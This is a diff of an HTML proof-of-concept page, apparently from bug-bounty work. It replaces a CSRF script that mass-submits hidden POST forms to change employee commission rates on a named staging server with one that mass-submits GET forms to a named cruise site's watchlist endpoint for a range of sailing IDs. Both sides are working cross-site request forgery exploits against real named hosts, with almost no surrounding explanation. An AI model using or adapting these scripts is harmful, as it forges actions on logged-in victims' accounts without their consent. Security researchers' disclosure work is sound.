@@ -1,42 +1,21 @@
+<!doctype html>
 <html>
   <body>
-    <h3>CSRF Mass Update PoC with Delay</h3>
     <script>
-      const target = "https://stagingdev.pestroutes.com/resources/routers/commissionRateRouter.php";
-      const start = 10604;
-      const end = 10607;
-      const delay = 1000; // milliseconds = 1 second
-
-      async function submitCSRF() {
-        for (let id = start; id <= end; id++) {
-          let form = document.createElement("form");
-          form.method = "POST";
-          form.action = target;
-          form.style.display = "none";
-
-          form.innerHTML = `
-            <input type="hidden" name="newEmployeeCommissionRate" value="1" />
-            <input type="hidden" name="validate" value="1" />
-            <input type="hidden" name="employeeID" value="${id}" />
-            <input type="hidden" name="commissionTypeID" value="1000" />
-            <input type="hidden" name="rateType" value="flat" />
-            <input type="hidden" name="commissionValue" value="15" />
-            <input type="hidden" name="commissionProfileID" value="1" />
-            <input type="hidden" name="action" value="save" />
-          `;
-
-          document.body.appendChild(form);
-          form.submit();
-
-          // Wait before next submission
-          await new Promise(resolve => setTimeout(resolve, delay));
-        }
-
-        // Clean up URL bar
-        history.pushState("", "", "/");
+      const startID = 770437, endID = 770441, delay = 600; // ms
+      function hit(id) {
+        const f = document.createElement("form");
+        f.method = "GET";
+        f.action = "https://www.cruises.com/brandmoversaddtowatchlist.do";
+        const s = document.createElement("input");
+        s.type = "hidden"; s.name = "sailingId"; s.value = id;
+        f.appendChild(s);
+        document.body.appendChild(f);
+        f.submit(); // top-level navigation; cookies sent with SameSite=Lax
       }
-
-      submitCSRF();
+      let i = startID;
+      function next(){ if(i<=endID){ hit(i++); setTimeout(next, delay); } }
+      next();
     </script>
   </body>
 </html>
